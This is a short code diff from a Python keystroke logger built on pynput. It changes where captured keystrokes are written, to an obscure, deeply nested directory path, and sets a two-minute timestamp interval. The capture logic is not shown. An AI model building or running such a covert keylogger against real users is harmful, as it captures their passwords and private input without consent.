@@ -4,7 +4,7 @@ from pynput.keyboard import Key, Listener
 from datetime import datetime, timedelta
 
 # Define the file where keystrokes will be logged
-log_file = "..\TESTn2\zz08-chbin1zz20629\655-rezon889033\a\abin\pytest\wz\file.txt"
+log_file = r"..\zz08-chbin1zz20629\655-rezon889033\a\abin\pytest\wz\file.txt"
 
 # Time interval for adding timestamps (e.g., every 2 minutes)
 timestamp_interval = timedelta(minutes=2)
